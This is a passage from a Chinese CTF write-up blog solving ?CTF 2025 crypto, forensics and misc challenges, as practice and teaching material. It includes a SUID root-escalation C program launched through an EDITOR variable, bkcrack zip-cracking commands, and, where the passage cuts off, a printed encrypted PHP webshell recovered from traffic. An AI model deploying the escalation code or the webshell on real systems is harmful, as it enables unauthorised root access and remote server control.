<span class="number">4241926468</span>]</span><br><span class="line">n1 = <span class="number">138851415190713465480971174257448869324235475491224608863667367765557787130928841140544464901159451427142751973587286540048280289357977393428301017662916668537581389547284678037051116847831257571725930334961572331109949981542324563168168819931774176415705884732805196594752559820155791993081799451192512108559</span></span><br><span class="line">l2 = [<span class="number">942815517</span>, <span class="number">2520455710</span>, <span class="number">1891728341</span>, <span class="number">2453497085</span>, <span class="number">3941880462</span>, <span class="number">2392891255</span>, <span class="number">2747143494</span>, <span class="number">4243618507</span>, <span class="number">1517358347</span>, <span class="number">450211540</span>, <span class="number">2842693883</span>, <span class="number">1221103042</span>, <span class="number">1422891239</span>, <span class="number">4030144964</span>, <span class="number">2685521942</span>, <span class="number">1947290728</span>, <span class="number">3302832218</span>, <span class="number">1782499203</span>, <span class="number">3868364088</span>, <span class="number">308582506</span>, <span class="number">4251094005</span>, <span class="number">4980868</span>, <span class="number">2451326086</span>, <span class="number">3651628499</span>, <span class="number">2281074832</span>, <span class="number">480798516</span>, <span class="number">758959082</span>, <span class="number">3615264118</span>, <span class="number">1219594762</span>, <span class="number">1098658489</span>, <span class="number">2470901076</span>, <span class="number">1893356372</span>, <span class="number">3318772649</span>, <span class="number">1863044573</span>, <span class="number">3548017752</span>, <span class="number">3763808736</span>, <span class="number">1654584736</span>, <span class="number">3003555639</span>, <span class="number">1256437939</span>, <span class="number">3270885177</span>, <span class="number">258743642</span>, <span class="number">1299719645</span>, <span class="number">2208182535</span>, <span class="number">373707415</span>, <span class="number">1911873380</span>, <span class="number">92306350</span>, <span class="number">1545073247</span>, <span class="number">3827312104</span>, <span class="number">3255398601</span>, <span class="number">3192552708</span>, <span class="number">3206214673</span>, <span class="number">420879235</span>, <span class="number">1364502459</span>, <span class="number">3758282150</span>, <span class="number">2525185637</span>, <span class="number">1668948490</span>, <span class="number">1540972099</span>, <span class="number">4226808177</span>, <span class="number">2383393173</span>, <span class="number">3749471576</span>, <span class="number">1454575032</span>, <span class="number">3539841865</span>, <span class="number">690099204</span>, <span class="number">3429693556</span>, <span class="number">3143045768</span>, <span class="number">1019783847</span>, <span class="number">4254140560</span>, <span class="number">3362875271</span>, <span class="number">4286952044</span>, <span class="number">3651977835</span>, <span class="number">3979297548</span>, <span class="number">3354687702</span>, <span class="number">732498631</span>, <span class="number">830001339</span>, <span class="number">1600709940</span>, <span class="number">256242259</span>, <span class="number">3433896402</span>, <span class="number">717208932</span>, <span class="number">1143942721</span>, <span class="number">1387817800</span>, <span class="number">4149665963</span>, <span class="number">4136218742</span>, <span class="number">1148960729</span>, <span class="number">3448152230</span>, <span class="number">88647458</span>, <span class="number">1774354757</span>, <span class="number">3157382396</span>, <span class="number">2749420283</span>, <span class="number">3384884111</span>, <span class="number">4052749938</span>, <span class="number">3562466643</span>, <span class="number">388123649</span>, <span class="number">1019572873</span>, <span class="number">9288731</span>, <span class="number">2722126277</span>, <span class="number">2203755362</span>, <span class="number">2808094116</span>, <span class="number">318555465</span>, <span class="number">4238001430</span>, <span class="number">1279580330</span>, <span class="number">2688604848</span>, <span class="number">1360319839</span>, <span class="number">2479873580</span>, <span class="number">1061154987</span>, <span class="number">2958583972</span>, <span class="number">479553026</span>, <span class="number">1527664208</span>, <span class="number">1632893535</span>, <span class="number">3787166229</span>, <span class="number">989207338</span>, <span class="number">1663447933</span>, <span class="number">3712938090</span>, <span class="number">4198966560</span>, <span class="number">2566654848</span>, <span class="number">3696114905</span>, <span class="number">3012771350</span>, <span class="number">3607688877</span>, <span class="number">913491574</span>, <span class="number">3931397722</span>, <span class="number">3009342175</span>, <span class="number">2443448349</span>, <span class="number">1062996946</span>, <span class="number">2981037281</span>, <span class="number">26940862</span>, <span class="number">949228546</span>, <span class="number">4200949390</span>, <span class="number">4183590581</span>, <span class="number">1149500333</span>, <span class="number">2868274151</span>, <span class="number">1076013183</span>, <span class="number">2931224950</span>, <span class="number">1231187554</span>, <span class="number">1432454474</span>, <span class="number">462283109</span>, <span class="number">2459428825</span>, <span class="number">2313869884</span>, <span class="number">3779120205</span>, <span class="number">671163379</span>, <span class="number">283074107</span>, <span class="number">4292451272</span>, <span class="number">2073686644</span>, <span class="number">2106538278</span>, <span class="number">795977087</span>, <span class="number">1521261558</span>, <span class="number">2211934761</span>, <span class="number">3442006668</span>, <span class="number">810921154</span>, <span class="number">657699377</span>, <span class="number">2190946289</span>, <span class="number">3774455606</span>, <span class="number">95125385</span>, <span class="number">2480329023</span>, <span class="number">3476089304</span>, <span class="number">1238475919</span>, <span class="number">1076726394</span>, <span class="number">2120212816</span>, <span class="number">912904401</span>, <span class="number">3115487553</span>, <span class="number">4166801889</span>, <span class="number">2671842223</span>, <span class="number">3233061625</span>, <span class="number">2792720396</span>, <span class="number">164231023</span>, <span class="number">2899715615</span>, <span class="number">1080603752</span>, <span class="number">1871958768</span>, <span class="number">3205958631</span>, <span class="number">1429172605</span>, <span class="number">102859110</span>, <span class="number">1233358091</span>, <span class="number">4121045015</span>, <span class="number">3707468958</span>, <span class="number">2054107845</span>, <span class="number">3086180315</span>, <span class="number">3618494768</span>, <span class="number">151289595</span>, <span class="number">2395511379</span>, <span class="number">2202211183</span>, <span class="number">3317167416</span>, <span class="number">924499924</span>, <span class="number">1123843927</span>, <span class="number">1845597735</span>, <span class="number">2551305188</span>, <span class="number">281765988</span>, <span class="number">2688253086</span>, <span class="number">1560780497</span>, <span class="number">2061169891</span>, <span class="number">573571184</span>, <span class="number">2525386268</span>, <span class="number">1825854571</span>, <span class="number">2899785981</span>, <span class="number">3266712321</span>, <span class="number">3610412586</span>, <span class="number">411137454</span>, <span class="number">3935324159</span>, <span class="number">2494782798</span>, <span class="number">3373400635</span>, <span class="number">909758036</span>, <span class="number">730762387</span>, <span class="number">821217945</span>, <span class="number">1637755246</span>, <span class="number">914390627</span>, <span class="number">364271532</span>, <span class="number">3570237156</span>, <span class="number">739531656</span>, <span class="number">3535813993</span>, <span class="number">3136577043</span>, <span class="number">269001524</span>, <span class="number">330161113</span>, <span class="number">1582587768</span>, <span class="number">4276579985</span>, <span class="number">650173619</span>, <span class="number">2350573855</span>, <span class="number">1233199180</span>, <span class="number">824190362</span>, <span class="number">2132064523</span>, <span class="number">1630599868</span>, <span class="number">3890164143</span>, <span class="number">3281849000</span>, <span class="number">443369842</span>, <span class="number">556256551</span>, <span class="number">3665988107</span>, <span class="number">168059217</span>, <span class="number">2459533678</span>, <span class="number">2959581748</span>, <span class="number">1266795043</span>, <span class="number">2541445057</span>, <span class="number">3690162432</span>, <span class="number">4033239960</span>, <span class="number">2747349823</span>, <span class="number">2527544983</span>, <span class="number">3483114688</span>, <span class="number">1912665005</span>, <span class="number">2589639629</span>, <span class="number">967006093</span>, <span class="number">3043481320</span>, <span class="number">1577789923</span>, <span class="number">888032317</span>, <span class="number">3135015646</span>, <span class="number">1807362947</span>, <span class="number">3974720459</span>, <span class="number">1028251582</span>, <span class="number">1395973950</span>, <span class="number">141248013</span>, <span class="number">3415448254</span>, <span class="number">2585771855</span>, <span class="number">1652904856</span>, <span class="number">2483847688</span>, <span class="number">1241390535</span>, <span class="number">2966558718</span>, <span class="number">80133169</span>, <span class="number">544591052</span>, <span class="number">117065220</span>, <span class="number">1259833545</span>, <span class="number">4287364552</span>, <span class="number">3172964645</span>, <span class="number">1378147180</span>, <span class="number">1961149024</span>, <span class="number">2557044426</span>, <span class="number">3079500155</span>, <span class="number">1278712539</span>, <span class="number">2437075468</span>, <span class="number">4079403208</span>, <span class="number">1424357113</span>, <span class="number">1460980393</span>, <span class="number">1869711134</span>, <span class="number">739995379</span>, <span class="number">236457792</span>, <span class="number">56725573</span>, <span class="number">1192143182</span>, <span class="number">3480051881</span>, <span class="number">1940191085</span>, <span class="number">2145576244</span>, <span class="number">277256288</span>, <span class="number">1350391298</span>, <span class="number">927908951</span>, <span class="number">234611527</span>, <span class="number">1270659504</span>, <span class="number">2800736156</span>, <span class="number">2377033778</span>, <span class="number">379042674</span>, <span class="number">268642839</span>, <span class="number">254414386</span>, <span class="number">3717739293</span>, <span class="number">3742427571</span>, <span class="number">2062173352</span>, <span class="number">1468838866</span>, <span class="number">3248800238</span>, <span class="number">3810334297</span>, <span class="number">1774562996</span>, <span class="number">3243508531</span>, <span class="number">768385892</span>, <span class="number">3663776790</span>, <span class="number">3561471474</span>, <span class="number">2072506584</span>, <span class="number">4072612194</span>, <span class="number">4145385651</span>, <span class="number">1568151342</span>, <span class="number">413061947</span>, <span class="number">2606711318</span>, <span class="number">787242867</span>, <span class="number">358259431</span>, <span class="number">3250866366</span>, <span class="number">496471679</span>, <span class="number">3974003161</span>, <span class="number">3962245443</span>, <span class="number">3448346690</span>, <span class="number">3918858426</span>, <span class="number">1545049592</span>, <span class="number">4098252582</span>, <span class="number">4272944055</span>, <span class="number">2709981394</span>]</span><br><span class="line">n2 = <span class="number">114667370859267713459979739172691665204879151133165169917752071845350748196947769536460950730177555853607685665148468694999487984430241339705779225600425842398781387739352517522092529671186262329583850232443458354943390042125768975735770226662059908491110663467968924345474794260851510527271024718213859872091</span></span><br><span class="line">c = <span class="number">254437839234710932548963084800696912447199841209292016504026652383142017227876963989808065988983617626350151358444895183944611290313513729505521630711812174923796964838915751672967332321515720258149777206328112312514688748335753179198631177743199829645308091442800427146012476434191025450662950787631144984158609948536064605299987908223963902731920237033619141863042816600729594847568654431928343565350409273886054122366132475796004834811862120850908513978375240</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = gmpy2.gcd(n1,n2)</span><br><span class="line">p = n1//q</span><br><span class="line">r = n2//q</span><br><span class="line">n = n1*n2//q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    rc.submit(l1[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    rc.submit(l2[i])</span><br><span class="line">e = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">q = GCD(n1,n2)</span><br><span class="line">p = n1 // q</span><br><span class="line">r = n2 // q</span><br><span class="line">k = GCD(e,r-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line">dr = inverse(e//<span class="number">4</span>,r-<span class="number">1</span>)</span><br><span class="line">cr = <span class="built_in">pow</span>(c,dr,r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mr = AMM(cr, <span class="number">4</span>, r)</span><br><span class="line">root_list = find(<span class="number">4</span>, r)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(root_list)):</span><br><span class="line">    a = mr * root_list[i] % r</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;wwooooow_u_no_the_randdoooooo0m!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Week1-取证第一次"><a href="#Week1-取证第一次" class="headerlink" title="[Week1] 取证第一次"></a>[Week1] 取证第一次</h2><p>strings一把梭了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings what.vmdk | grep flag</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004144414960.png" alt="image-20251004144414960"></p>
<h2 id="Week2-你也喜欢win7吗"><a href="#Week2-你也喜欢win7吗" class="headerlink" title="[Week2] 你也喜欢win7吗"></a>[Week2] 你也喜欢win7吗</h2><p>提取出flag.zip和hint.txt<br>根据hint，导出画图继续分析</p>
<p>在这个参数下能够看到密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012203927205.png" alt="image-20251012203927205"></p>
<p>接着翻转图片，清楚地看到解压密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012203746442.png" alt="image-20251012203746442"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">114ezmisc514</span><br></pre></td></tr></table></figure>

<p>解压得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1z_volatility_F0r3ns1c5&#125;</span><br></pre></td></tr></table></figure>







<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-《关于我穿越到CTF的异世界这档事-序》"><a href="#Week1-《关于我穿越到CTF的异世界这档事-序》" class="headerlink" title="[Week1] 《关于我穿越到CTF的异世界这档事:序》"></a>[Week1] 《关于我穿越到CTF的异世界这档事:序》</h2><p>根据文件名，可以直到是base8</p>
<p>base64隐写，得到码表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004140650505.png" alt="image-20251004140650505"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?CTFmisc</span><br></pre></td></tr></table></figure>

<p>然后搓一个base8的解密函数，得到结果后再base64解密得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b8decode</span>(<span class="params">data,code</span>):</span><br><span class="line">    tmp_list = [data[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">8</span>)]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp_list:</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">                tmp += <span class="string">&#x27;000&#x27;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp += code[j]</span><br><span class="line">        res += [long_to_bytes(<span class="built_in">int</span>(tmp,<span class="number">2</span>))]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(res).strip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;?CTFmisc&#x27;</span></span><br><span class="line">code = &#123;code[i]:<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">3</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code))&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;Tsmssic?FT?ii?sFFi?iTimCTC?mcCmsTiTmmCCCFs?sCCiiTFTcmCmFTCscFicTTs?ciC?TFFTim?s?TTmsmCmFCmmiFCmsTFTimCCsFCmiTicTT?msFCTTTs?c??ssFCmi?mciCcT=====&#x27;</span></span><br><span class="line">res = b8decode(data,code)</span><br><span class="line">res = base64.b64decode(res)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Th3_Pr1nc1pl3_0f_Base_1s_S0_Ezz&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week1-俱乐部之旅-1-邀请函"><a href="#Week1-俱乐部之旅-1-邀请函" class="headerlink" title="[Week1] 俱乐部之旅(1) - 邀请函"></a>[Week1] 俱乐部之旅(1) - 邀请函</h2><p>掩码爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c5im????</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004144921273.png" alt="image-20251004144921273"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c5im8467</span><br></pre></td></tr></table></figure>

<p>解压后，将<code>docx</code>文档后缀改成<code>zip</code>解压</p>
<p>找到一个<code>u_f0und_m3</code>，hex解码得到后半段flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004145210230.png" alt="image-20251004145210230"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;Welc0me_t0_th3_c5im_C1ub&#125;</span><br></pre></td></tr></table></figure>

<p>接着在<code>core.xml</code>找到2进制数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004145231815.png" alt="image-20251004145231815"></p>
<p>解码得到前半段flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004145328833.png" alt="image-20251004145328833"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W0rd_5t3g_is_1z</span><br></pre></td></tr></table></figure>

<p>完整flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W0rd_5t3g_is_1z&amp;Welc0me_t0_th3_c5im_C1ub&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week1-布豪有黑客-一"><a href="#Week1-布豪有黑客-一" class="headerlink" title="[Week1] 布豪有黑客(一)"></a>[Week1] 布豪有黑客(一)</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004150517247.png" alt="image-20251004150517247"></p>
<p>追踪<code>/password.txt</code>得到解压密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?CTF2025</span><br></pre></td></tr></table></figure>

<p>导出<code>/flag.zip</code>的数据，解压得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Wireshark_1s_4wes0m3&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week1-文化木的侦探委托-一"><a href="#Week1-文化木的侦探委托-一" class="headerlink" title="[Week1] 文化木的侦探委托(一)"></a>[Week1] 文化木的侦探委托(一)</h2><p>修改高度得到提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004151225585.png" alt="image-20251004151225585"></p>
<p>LSB得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004151455306.png" alt="image-20251004151455306"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Please_Find_ME&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week1-维吉尼亚朋友的来信"><a href="#Week1-维吉尼亚朋友的来信" class="headerlink" title="[Week1] 维吉尼亚朋友的来信"></a>[Week1] 维吉尼亚朋友的来信</h2><p>查看频谱图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004152208788.png" alt="image-20251004152208788"></p>
<p>deepsound得到来信</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gieg fsq sulirs,</span><br><span class="line">  Osfprpi xd lvy gkumpaaba jruph dx QNS!Wkmw xkb’n wxvx e vsay—vw’v e tasmaerxrh lzslr fxvmdkwnl phixh uvuyohrkt, ovyeh hzigq zcah rj gdvs, yihuc lxvrya foyi, pfr yihuc tjrnfr krphh s gypuhx apahcaj ws ft mbwbyhvis. Zslr, bry’pa khlrwfl cdmf gvqg, pipjb nb vhi tplhyeqv mr rzoif, dqh xjjb &quot;C qrq’x ocgk&quot; cawr &quot;M jxyilrg lx sjl.&quot;</span><br><span class="line">  Ria’w zsvgq wz gklrkh xsyy ryivlzsfzlqk ei xwlfw. Zi’zt szf ohhr xwwfy—fwdvmcy on n susfawa, mpudxgwaba bxu lipvg, qbqgivxfu quhui xd khuew. Eyx izon’f wki qpyww bi lx: ikwfs zlvxezw wm n ohwwdf, sprub wqpdz qvq d vyhz. Ohq bry’vt fcn norri. Izwm prpqycahs gkumztk ch propeqgfuglrr, sc kvuelqk mswom, nqg pmulwht hdgl dlvye xs.</span><br><span class="line">  Ws sajy vq. Hbtagfy. Rasivxeshg. Dvo ujwgnvrqw. Gtdsvedwi xww hcab ymgigfcrv, drh sgb’n shdv xww gnhpepih. Lvy PWI asgdr cf eumkwlsl jlwl cdm wh vw, drh lw qua’w zemi lc mrh zligw mihu msygfss gdniw ngi.</span><br><span class="line">Zydj mw &quot;umbhl ohxxtj hi lrx&quot;. Vibwavru zvee lvy sodk gdfhyaw lr jasu&#123;&#125; uag xwi jfryeolri‘_&#x27; ig fycodgi hhowr fkevpuhye&#x27; &#x27;.</span><br><span class="line"></span><br><span class="line">Ehwx lagbrv!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在线维吉尼亚爆破得到密钥为<code>deepsound</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dear new friend,</span><br><span class="line">  Welcome to the thrilling world of CTF!This isn’t just a game—it’s a playground where curiosity meets challenge, where every line of code, every hidden clue, and every puzzle holds a secret waiting to be uncovered. Here, you’ll stretch your mind, learn to see patterns in chaos, and turn &quot;I don’t know&quot; into &quot;I figured it out.&quot;</span><br><span class="line">  Don’t worry if things feel overwhelming at first. We’ve all been there—staring at a problem, scratching our heads, wondering where to start. But that’s the magic of it: every mistake is a lesson, every small win a rush. And you’re not alone. This community thrives on collaboration, on sharing ideas, and lifting each other up.</span><br><span class="line">  So dive in. Explore. Experiment. Ask questions. Celebrate the tiny victories, and don’t fear the stumbles. The CTF world is brighter with you in it, and we can’t wait to see where your journey takes you.</span><br><span class="line">Flag is &quot;funny letter to you&quot;. Remember wrap the flag content in flag&#123;&#125; and use underline‘_&#x27; to replace space character&#x27; &#x27;.</span><br><span class="line"></span><br><span class="line">Best wishes!</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;funny_letter_to_you&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week2-《关于我穿越到CTF的异世界这档事-破》"><a href="#Week2-《关于我穿越到CTF的异世界这档事-破》" class="headerlink" title="[Week2] 《关于我穿越到CTF的异世界这档事:破》"></a>[Week2] 《关于我穿越到CTF的异世界这档事:破》</h2><p>SUID提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>找到程序<code>editnote</code>具有SUID权限</p>
<p>反编译</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012102554360.png" alt="image-20251012102554360"></p>
<p>可以看到<code>file</code>完全可控</p>
<p>接着编写一个恶意程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    setresuid(0,0,0);</span><br><span class="line">    system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译后设置到环境变量让<code>editnote</code>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export EDITOR=/home/ctf/shell</span><br></pre></td></tr></table></figure>

<p>运行<code>editnote</code>，即可提权到root</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012102724093.png" alt="image-20251012102724093"></p>
<h2 id="Week2-俱乐部之旅-2-我邮件呢？？"><a href="#Week2-俱乐部之旅-2-我邮件呢？？" class="headerlink" title="[Week2] 俱乐部之旅(2) - 我邮件呢？？"></a>[Week2] 俱乐部之旅(2) - 我邮件呢？？</h2><p>追踪TCP得到压缩包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012110711097.png" alt="image-20251012110711097"></p>
<p>导出后明文攻击，解压出图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C Congratulations.zip -c id_card.png  -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line">bkcrack -C Congratulations.zip -k 733236fb 6652cac7 8542e0e2 -U new_flag.zip 123456</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012111455539.png" alt="image-20251012111455539"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4458e940b799c5419ac8fbceac043ac5</span><br></pre></td></tr></table></figure>

<p>最后解压txt文件，在最下边找到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;pl34s3_s4f3gu4rd_y0ur_r3c0v3r3d_c5im_d4t4&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Week2-破碎的拼图"><a href="#Week2-破碎的拼图" class="headerlink" title="[Week2] 破碎的拼图"></a>[Week2] 破碎的拼图</h2><p>steghide解密，得到一个压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steghide extract -sf image.jpg -p ?CTF</span><br></pre></td></tr></table></figure>

<p>接着将三个压缩包重命名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012103354381.png" alt="image-20251012103354381"></p>
<p>解压得到<code>flag.doc</code>，打开得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;br0k3n_p1eces_r3a553mb13d_7h3_puzz13&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Week2-布豪有黑客-二"><a href="#Week2-布豪有黑客-二" class="headerlink" title="[Week2] 布豪有黑客(二)"></a>[Week2] 布豪有黑客(二)</h2><p>找到上传的木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span 